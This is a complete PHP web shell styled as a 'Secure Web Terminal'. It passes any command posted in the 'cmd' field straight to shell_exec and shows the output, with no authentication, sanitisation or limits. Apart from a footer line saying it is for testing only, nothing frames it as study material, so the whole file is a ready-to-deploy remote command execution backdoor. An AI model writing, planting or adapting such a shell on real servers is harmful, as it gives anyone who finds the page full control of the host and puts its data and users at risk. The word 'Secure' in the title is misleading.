<?php
$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Web Terminal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: "Courier New", Courier, monospace;
            background-color: #202020;
            color: #cccccc;
            margin: 0;
            padding: 0;
        }
        main {
            max-width: 900px;
            margin: 50px auto;
            padding: 30px;
            background-color: #2e2e2e;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }
        h1, h2 {
            color: #00c2ff;
            font-weight: normal;
        }
        form {
            margin-top: 20px;
        }
        .form-group {
            display: flex;
            flex-direction: row;
            gap: 10px;
        }
        input[type="text"] {
            flex-grow: 1;
            padding: 12px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #444;
            background-color: #3a3a3a;
            color: #f0f0f0;
        }
        input:focus {
            border-color: #00c2ff;
            outline: none;
            background-color: #2d2d2d;
        }
        button {
            padding: 12px 20px;
            background-color: #00c2ff;
            color: #000;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #00aadd;
        }
        pre {
            margin-top: 25px;
            background-color: #000;
            color: #33ff33;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        footer {
            margin-top: 40px;
            font-size: 14px;
            text-align: center;
            color: #666;
        }
        .author {
            text-align: right;
            font-size: 13px;
            color: #555;
        }
    </style>
</head>
<body>
<main>
    <h1>Custom Web Terminal</h1>
    <h2>Remote Command Executor</h2>

    <form method="post">
        <label for="cmd"><strong>Command</strong></label>
        <div class="form-group">
            <input type="text" name="cmd" id="cmd" placeholder="Enter Linux command..." required>
            <button type="submit">Run</button>
        </div>
    </form>

    <?php if (!empty($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>

    
</main>

<footer>
    For testing purposes only. Unauthorized use is prohibited.
</footer>
</body>
</html>
